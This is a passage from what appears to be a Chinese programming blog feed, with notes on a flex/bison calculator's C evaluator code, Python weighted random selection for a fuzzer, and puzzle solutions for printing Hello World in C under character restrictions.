class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//一些内建函数的实现，cc支持的</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">double</span></span><br><span class="line">callbuiltin(<span class="keyword">struct</span> fncall *f)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">enum</span> bifs functype = f-&gt;functype;</span><br><span class="line">  <span class="keyword">double</span> v = eval(f-&gt;l);</span><br><span class="line"></span><br><span class="line"> <span class="keyword">switch</span>(functype) &#123;</span><br><span class="line"> <span class="keyword">case</span> B_sqrt:</span><br><span class="line">   <span class="keyword">return</span> <span class="built_in">sqrt</span>(v);</span><br><span class="line"> <span class="keyword">case</span> B_exp:</span><br><span class="line">   <span class="keyword">return</span> <span class="built_in">exp</span>(v);</span><br><span class="line"> <span class="keyword">case</span> B_log:</span><br><span class="line">   <span class="keyword">return</span> <span class="built_in">log</span>(v);</span><br><span class="line"> <span class="keyword">case</span> B_print:</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"= %4.4g\n"</span>, v);</span><br><span class="line">   <span class="keyword">return</span> v;</span><br><span class="line"> <span class="keyword">default</span>:</span><br><span class="line">   yyerror(<span class="string">"Unknown built-in function %d"</span>, functype);</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0.0</span>;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//函数调用的实现，比较重要的部分。</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">double</span></span><br><span class="line">calluser(<span class="keyword">struct</span> ufncall *f)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">//获取函数的信息，函数名，参数等</span></span><br><span class="line">  <span class="keyword">struct</span> symbol *fn = f-&gt;s;    <span class="comment">/* function name */</span></span><br><span class="line">  <span class="comment">//形参</span></span><br><span class="line">  <span class="keyword">struct</span> symlist *sl;        <span class="comment">/* dummy arguments */</span></span><br><span class="line">  <span class="comment">//实参</span></span><br><span class="line">  <span class="keyword">struct</span> ast *args = f-&gt;l;    <span class="comment">/* actual arguments */</span></span><br><span class="line">  <span class="comment">//保存的参数</span></span><br><span class="line">  <span class="keyword">double</span> *oldval, *newval;    <span class="comment">/* saved arg values */</span></span><br><span class="line">  <span class="keyword">double</span> v;</span><br><span class="line">  <span class="keyword">int</span> nargs;</span><br><span class="line">  <span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(!fn-&gt;func) &#123;</span><br><span class="line">    yyerror(<span class="string">"call to undefined function"</span>, fn-&gt;name);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">//获取参数数量，从形参列表遍历获得</span></span><br><span class="line">  <span class="comment">/* count the arguments */</span></span><br><span class="line">  sl = fn-&gt;syms;</span><br><span class="line">  <span class="keyword">for</span>(nargs = <span class="number">0</span>; sl; sl = sl-&gt;next)</span><br><span class="line">    nargs++;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//为保存参数分配空间</span></span><br><span class="line">  <span class="comment">/* prepare to save them */</span></span><br><span class="line">  oldval = (<span class="keyword">double</span> *)<span class="built_in">malloc</span>(nargs * <span class="keyword">sizeof</span>(<span class="keyword">double</span>));</span><br><span class="line">  newval = (<span class="keyword">double</span> *)<span class="built_in">malloc</span>(nargs * <span class="keyword">sizeof</span>(<span class="keyword">double</span>));</span><br><span class="line">  <span class="keyword">if</span>(!oldval || !newval) &#123;</span><br><span class="line">    yyerror(<span class="string">"Out of space in %s"</span>, fn-&gt;name); <span class="keyword">return</span> <span class="number">0.0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">//参数可能是表达式，所以需要对其求值。</span></span><br><span class="line">  <span class="comment">//比如 max(1+2,5) 就需要对第一个参数先求值，然后再进行计算。</span></span><br><span class="line">  <span class="comment">/* evaluate the arguments */</span></span><br><span class="line">  <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; nargs; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span>(!args) &#123;</span><br><span class="line">      yyerror(<span class="string">"too few args in call to %s"</span>, fn-&gt;name);</span><br><span class="line">      <span class="built_in">free</span>(oldval); <span class="built_in">free</span>(newval);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(args-&gt;nodetype == <span class="string">'L'</span>) &#123;    <span class="comment">/* if this is a list node */</span></span><br><span class="line">      newval[i] = eval(args-&gt;l);</span><br><span class="line">      args = args-&gt;r;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;            <span class="comment">/* if it's the end of the list */</span></span><br><span class="line">      newval[i] = eval(args);</span><br><span class="line">      args = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">//保存形参的旧值，然后更新新值</span></span><br><span class="line">  <span class="comment">//比如 max(1+2,4-1) 更新成 max(3，3)</span></span><br><span class="line">  <span class="comment">/* save old values of dummies, assign new ones */</span></span><br><span class="line">  sl = fn-&gt;syms;</span><br><span class="line">  <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; nargs; i++) &#123;</span><br><span class="line">    <span class="keyword">struct</span> symbol *s = sl-&gt;sym;</span><br><span class="line"></span><br><span class="line">    oldval[i] = s-&gt;value;</span><br><span class="line">    s-&gt;value = newval[i];</span><br><span class="line">    sl = sl-&gt;next;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">free</span>(newval);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* evaluate the function */</span> <span class="comment">//参数都更新完了之后，就可以直接去计算函数值了</span></span><br><span class="line">  v = eval(fn-&gt;func);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* put the dummies back */</span>  <span class="comment">//因为之前更改了形参的list，现在要恢复</span></span><br><span class="line">  sl = fn-&gt;syms;</span><br><span class="line">  <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; nargs; i++) &#123;</span><br><span class="line">    <span class="keyword">struct</span> symbol *s = sl-&gt;sym;</span><br><span class="line"></span><br><span class="line">    s-&gt;value = oldval[i];</span><br><span class="line">    sl = sl-&gt;next;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(oldval);</span><br><span class="line">  <span class="keyword">return</span> v;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//释放节点，分情况，因为不同的操作符，子树数目不同，所以要分情况。</span></span><br><span class="line"><span class="keyword">void</span></span><br><span class="line">treefree(<span class="keyword">struct</span> ast *a)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">switch</span>(a-&gt;nodetype) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* two subtrees */</span></span><br><span class="line">  <span class="keyword">case</span> <span class="string">'+'</span>:</span><br><span class="line">  <span class="keyword">case</span> <span class="string">'-'</span>:</span><br><span class="line">  <span class="keyword">case</span> <span class="string">'*'</span>:</span><br><span class="line">  <span class="keyword">case</span> <span class="string">'/'</span>:</span><br><span class="line">  <span class="keyword">case</span> <span class="string">'1'</span>:  <span class="keyword">case</span> <span class="string">'2'</span>:  <span class="keyword">case</span> <span class="string">'3'</span>:  <span class="keyword">case</span> <span class="string">'4'</span>:  <span class="keyword">case</span> <span class="string">'5'</span>:  <span class="keyword">case</span> <span class="string">'6'</span>:</span><br><span class="line">  <span class="keyword">case</span> <span class="string">'L'</span>:</span><br><span class="line">    treefree(a-&gt;r);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* one subtree */</span></span><br><span class="line">  <span class="keyword">case</span> <span class="string">'|'</span>:</span><br><span class="line">  <span class="keyword">case</span> <span class="string">'M'</span>: <span class="keyword">case</span> <span class="string">'C'</span>: <span class="keyword">case</span> <span class="string">'F'</span>:</span><br><span class="line">    treefree(a-&gt;l);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* no subtree */</span></span><br><span class="line">  <span class="keyword">case</span> <span class="string">'K'</span>: <span class="keyword">case</span> <span class="string">'N'</span>:</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">case</span> <span class="string">'='</span>:</span><br><span class="line">    <span class="built_in">free</span>( ((<span class="keyword">struct</span> symasgn *)a)-&gt;v);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">case</span> <span class="string">'I'</span>: <span class="keyword">case</span> <span class="string">'W'</span>:</span><br><span class="line">    <span class="built_in">free</span>( ((<span class="keyword">struct</span> flow *)a)-&gt;cond);</span><br><span class="line">    <span class="keyword">if</span>( ((<span class="keyword">struct</span> flow *)a)-&gt;tl) <span class="built_in">free</span>( ((<span class="keyword">struct</span> flow *)a)-&gt;tl);</span><br><span class="line">    <span class="keyword">if</span>( ((<span class="keyword">struct</span> flow *)a)-&gt;el) <span class="built_in">free</span>( ((<span class="keyword">struct</span> flow *)a)-&gt;el);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">default</span>: <span class="built_in">printf</span>(<span class="string">"internal error: free bad node %c\n"</span>, a-&gt;nodetype);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(a); <span class="comment">/* always free the node itself */</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span></span><br><span class="line">yyerror(<span class="keyword">char</span> *s, ...)</span><br><span class="line">&#123;</span><br><span class="line">  va_list ap;</span><br><span class="line">  va_start(ap, s);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"%d: error: "</span>, yylineno);</span><br><span class="line">  <span class="built_in">vfprintf</span>(<span class="built_in">stderr</span>, s, ap);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span></span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"&gt; "</span>);</span><br><span class="line">  <span class="keyword">return</span> yyparse();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//把ast dump出来做显示，方便调试</span></span><br><span class="line"><span class="comment">/* debugging: dump out an AST */</span></span><br><span class="line"><span class="keyword">int</span> debug = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">void</span></span><br><span class="line">dumpast(<span class="keyword">struct</span> ast *a, <span class="keyword">int</span> level)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"%*s"</span>, <span class="number">2</span>*level, <span class="string">""</span>);    <span class="comment">/* indent to this level */</span></span><br><span class="line">  level++;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(!a) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"NULL\n"</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">switch</span>(a-&gt;nodetype) &#123;</span><br><span class="line">    <span class="comment">/* constant */</span></span><br><span class="line">  <span class="keyword">case</span> <span class="string">'K'</span>: <span class="built_in">printf</span>(<span class="string">"number %4.4g\n"</span>, ((<span class="keyword">struct</span> numval *)a)-&gt;number); <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* name reference */</span></span><br><span class="line">  <span class="keyword">case</span> <span class="string">'N'</span>: <span class="built_in">printf</span>(<span class="string">"ref %s\n"</span>, ((<span class="keyword">struct</span> symref *)a)-&gt;s-&gt;name); <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* assignment */</span></span><br><span class="line">  <span class="keyword">case</span> <span class="string">'='</span>: <span class="built_in">printf</span>(<span class="string">"= %s\n"</span>, ((<span class="keyword">struct</span> symref *)a)-&gt;s-&gt;name);</span><br><span class="line">    dumpast( ((<span class="keyword">struct</span> symasgn *)a)-&gt;v, level); <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* expressions */</span></span><br><span class="line">  <span class="keyword">case</span> <span class="string">'+'</span>: <span class="keyword">case</span> <span class="string">'-'</span>: <span class="keyword">case</span> <span class="string">'*'</span>: <span class="keyword">case</span> <span class="string">'/'</span>: <span class="keyword">case</span> <span class="string">'L'</span>:</span><br><span class="line">  <span class="keyword">case</span> <span class="string">'1'</span>: <span class="keyword">case</span> <span class="string">'2'</span>: <span class="keyword">case</span> <span class="string">'3'</span>:</span><br><span class="line">  <span class="keyword">case</span> <span class="string">'4'</span>: <span class="keyword">case</span> <span class="string">'5'</span>: <span class="keyword">case</span> <span class="string">'6'</span>:</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"binop %c\n"</span>, a-&gt;nodetype);</span><br><span class="line">    dumpast(a-&gt;l, level);</span><br><span class="line">    dumpast(a-&gt;r, level);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">case</span> <span class="string">'|'</span>: <span class="keyword">case</span> <span class="string">'M'</span>:</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"unop %c\n"</span>, a-&gt;nodetype);</span><br><span class="line">    dumpast(a-&gt;l, level);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">case</span> <span class="string">'I'</span>: <span class="keyword">case</span> <span class="string">'W'</span>:</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"flow %c\n"</span>, a-&gt;nodetype);</span><br><span class="line">    dumpast( ((<span class="keyword">struct</span> flow *)a)-&gt;cond, level);</span><br><span class="line">    <span class="keyword">if</span>( ((<span class="keyword">struct</span> flow *)a)-&gt;tl)</span><br><span class="line">      dumpast( ((<span class="keyword">struct</span> flow *)a)-&gt;tl, level);</span><br><span class="line">    <span class="keyword">if</span>( ((<span class="keyword">struct</span> flow *)a)-&gt;el)</span><br><span class="line">      dumpast( ((<span class="keyword">struct</span> flow *)a)-&gt;el, level);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">case</span> <span class="string">'F'</span>:</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"builtin %d\n"</span>, ((<span class="keyword">struct</span> fncall *)a)-&gt;functype);</span><br><span class="line">    dumpast(a-&gt;l, level);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">case</span> <span class="string">'C'</span>: <span class="built_in">printf</span>(<span class="string">"call %s\n"</span>, ((<span class="keyword">struct</span> ufncall *)a)-&gt;s-&gt;name);</span><br><span class="line">    dumpast(a-&gt;l, level);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">default</span>: <span class="built_in">printf</span>(<span class="string">"bad %c\n"</span>, a-&gt;nodetype);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="0x03-使用"><a href="#0x03-使用" class="headerlink" title="0x03: 使用"></a>0x03: 使用</h4><p>测试环境 ubuntu 16.04 x64<br>这部分没啥意思，随便测试下就好了，主要还是看上面的代码。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># muhe @ ubuntu in ~/flexbison [20:49:52] </span>$ ./fb3-2 &gt; 1+123=  124&gt; 1=    1&gt; 2=    2&gt; 1.1+2=  3.1&gt; 3.33333/1.2344=  2.7</span><br><span class="line">&gt; <span class="built_in">let</span> max(x,y) = <span class="keyword">if</span> x &gt;= y <span class="keyword">then</span> x;<span class="keyword">else</span> y;;Defined max&gt; max(0.1,-0.2)=  0.1&gt; max(99999999999999999999999999999999999999999,999999999999999999999999999999999999999999999999999999999999999999999999999)= 1e+75&gt;</span><br></pre></td></tr></table></figure>
<p>设置了debug之后可以看到ast，方便调试：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&gt; <span class="built_in">let</span> max(x,y) = <span class="keyword">if</span> x &gt;= y <span class="keyword">then</span> x;<span class="keyword">else</span> y;;Defined max&gt; max(1,2)call max  binop L    number    1    number    2=    2&gt; </span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
<h4 id="0x04-sql分析"><a href="#0x04-sql分析" class="headerlink" title="0x04: sql分析"></a>0x04: sql分析</h4><p>书中第四章是一个sql的分析器，含词法分析、语法分析，代码量还好不算特别大。</p>
<p>目录结构:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ tree .</span><br><span class="line">.</span><br><span class="line">├── Makefile</span><br><span class="line">├── glrmysql.l  <span class="comment">#mysql子集词法分析器</span></span><br><span class="line">├── glrmysql.y  <span class="comment">#mysql子集语法分析器</span></span><br><span class="line">├── lpmysql.l</span><br><span class="line">├── lpmysql.y</span><br><span class="line">├── pmysql.l</span><br><span class="line">└── pmysql.y</span><br></pre></td></tr></table></figure></p>
<p><code>*.l</code>是词法分析部分，<code>*.y</code>是语法分析部分。</p>
<p>这里有三份代码，<code>glrxxxxx</code>是第四章的代码，<code>lpmxxxx</code>是第八章的代码，<code>pmysqlxx</code>是第九章的代码，这里只看第四章的代码，这个例子比较简单，简化了很多东西。</p>
<h4 id="0x05-引用"><a href="#0x05-引用" class="headerlink" title="0x05: 引用"></a>0x05: 引用</h4><p><a href="https://www.zhihu.com/question/20750344" target="_blank" rel="noopener">在编程概念中，表达式和语句分别是什么概念？</a><br><a href="https://zh.wikipedia.org/wiki/%E5%B7%A6%E9%81%9E%E6%AD%B8" target="_blank" rel="noopener">左递归</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;0x00-起因&quot;&gt;&lt;a href=&quot;#0x00-起因&quot; class=&quot;headerlink&quot; title=&quot;0x00: 起因&quot;&gt;&lt;/a&gt;0x00: 起因&lt;/h4&gt;&lt;p&gt;工作上的一些原因需要学习一下。做个记录督促自己读书学习，好好学习。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Study" scheme="http://o0xmuhe.me/tags/Study/"/>
    
  </entry>
  
  <entry>
    <title>Python指定概率获取随机元素</title>
    <link href="http://o0xmuhe.me/2017/12/30/Python%E6%8C%87%E5%AE%9A%E6%A6%82%E7%8E%87%E8%8E%B7%E5%8F%96%E9%9A%8F%E6%9C%BA%E5%85%83%E7%B4%A0/"/>
    <id>http://o0xmuhe.me/2017/12/30/Python指定概率获取随机元素/</id>
    <published>2017-12-30T09:17:01.000Z</published>
    <updated>2017-12-30T09:27:56.053Z</updated>
    
    <content type="html"><![CDATA[<h4 id="0x00"><a href="#0x00" class="headerlink" title="0x00:"></a>0x00:</h4><p>最近写fuzzer遇到了这样的一个需求，生成样本的时候，有些元素需要尽可能的多出现，而有些需要少一点，这就涉及到概率的问题了。然而直接使用random是不行的，暴力的在lib_list上做文章也不行，反而效率更低。看到了python cookbook的两个例子。</p>
<a id="more"></a>
<h4 id="0x01"><a href="#0x01" class="headerlink" title="0x01:"></a>0x01:</h4><h5 id="第一种，给定概率"><a href="#第一种，给定概率" class="headerlink" title="第一种，给定概率"></a>第一种，给定概率</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">random_pick</span><span class="params">(some_list,probabilities)</span>:</span></span><br><span class="line">    x = random.uniform(<span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line">    cumulative_probability=<span class="number">0.0</span></span><br><span class="line">    <span class="keyword">for</span> item,item_probability <span class="keyword">in</span> zip(some_list,probabilities):</span><br><span class="line">        cumulative_probability+=item_probability</span><br><span class="line">        <span class="keyword">if</span> x &lt; cumulative_probability:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> item</span><br></pre></td></tr></table></figure>
<p>两个参数，第一个是参数列表，第二个是概率的列表，概率列表里元素相加和必须等于1<br>比如这么调用：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">random_pick([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>],[<span class="number">0.1</span>,<span class="number">0.2</span>,<span class="number">0.3</span>,<span class="number">0.4</span>])</span><br></pre></td></tr></table></figure></p>
<p>写代码大概测了下，在大量(&gt;10w)的测试下，比较稳定，按照指定概率产生元素，比如x等于0.1就返回1。<br>但是不太适合较多参数的情况，需要一个一个指定概率啥的，还要计算好概率和为1…蛋疼。</p>
<h5 id="第二种，给权重"><a href="#第二种，给权重" class="headerlink" title="第二种，给权重"></a>第二种，给权重</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">random_picks</span><span class="params">(sequence,relative_odds)</span>:</span></span><br><span class="line">　　table=[z <span class="keyword">for</span> x,y <span class="keyword">in</span> zip(sequence,relative_odds) <span class="keyword">for</span> z <span class="keyword">in</span> [x]*y]</span><br><span class="line">　　<span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">　　　　<span class="keyword">yield</span> random.choice(table)</span><br><span class="line"></span><br><span class="line">x=random_picks(<span class="string">'ciao'</span>,[<span class="number">1</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">2</span>])</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">print</span> <span class="string">''</span>.join(itertools.islice(x,<span class="number">8</span>))</span><br></pre></td></tr></table></figure>
<p>第二种根据权重来返回，只要求权重是非负整数，比较容易使用，虽然还是要一个一个给权重，但是总比还要去计算个概率和，好很多。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;0x00&quot;&gt;&lt;a href=&quot;#0x00&quot; class=&quot;headerlink&quot; title=&quot;0x00:&quot;&gt;&lt;/a&gt;0x00:&lt;/h4&gt;&lt;p&gt;最近写fuzzer遇到了这样的一个需求，生成样本的时候，有些元素需要尽可能的多出现，而有些需要少一点，这就涉及到概率的问题了。然而直接使用random是不行的，暴力的在lib_list上做文章也不行，反而效率更低。看到了python cookbook的两个例子。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Python" scheme="http://o0xmuhe.me/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>Hello World升级版</title>
    <link href="http://o0xmuhe.me/2017/10/01/Hello-World%E5%8D%87%E7%BA%A7%E7%89%88/"/>
    <id>http://o0xmuhe.me/2017/10/01/Hello-World升级版/</id>
    <published>2017-10-01T10:02:25.000Z</published>
    <updated>2017-10-01T10:30:46.310Z</updated>
    
    <content type="html"><![CDATA[<h4 id="0x00"><a href="#0x00" class="headerlink" title="0x00:"></a>0x00:</h4><p>偶然在知乎上看到一个问题，特殊的方式输出hello world，后来知道这是cnss的招新题目，感觉还挺有意思的，做了下记录下来。</p>
<a id="more"></a>
<p>题目要求</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.不用 “ ”  输出Hello World</span><br><span class="line">2.不用 ;  输出Hello World</span><br><span class="line">3.不用#  输出Hello World</span><br><span class="line">4.不用括号输出Hello World (包括各种括号()，&lt;&gt;，｛｝，［］都不能用 )</span><br></pre></td></tr></table></figure>
<h4 id="0x01-level-1"><a href="#0x01-level-1" class="headerlink" title="0x01: level 1"></a>0x01: level 1</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$ cat test.c</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="number">72</span>);</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="number">101</span>);</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="number">108</span>);</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="number">108</span>);</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="number">111</span>);</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="number">32</span>);</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="number">119</span>);</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="number">111</span>);</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="number">114</span>);</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="number">108</span>);</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="number">100</span>);</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># muhe @ muheMacBookPro in /tmp [18:10:11]</span></span><br><span class="line">$ ./<span class="built_in">test</span></span><br><span class="line">Hello world</span><br></pre></td></tr></table></figure>
<h4 id="0x02-level-2"><a href="#0x02-level-2" class="headerlink" title="0x02: level 2"></a>0x02: level 2</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$ cat test.c</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">putchar</span>(<span class="number">72</span>)) &#123;&#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">putchar</span>(<span class="number">101</span>)) &#123;&#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">putchar</span>(<span class="number">108</span>)) &#123;&#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">putchar</span>(<span class="number">108</span>)) &#123;&#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">putchar</span>(<span class="number">111</span>)) &#123;&#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">putchar</span>(<span class="number">32</span>)) &#123;&#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">putchar</span>(<span class="number">119</span>)) &#123;&#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">putchar</span>(<span class="number">114</span>)) &#123;&#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">putchar</span>(<span class="number">108</span>)) &#123;&#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">putchar</span>(<span class="number">100</span>)) &#123;&#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">putchar</span>(<span class="number">10</span>)) &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
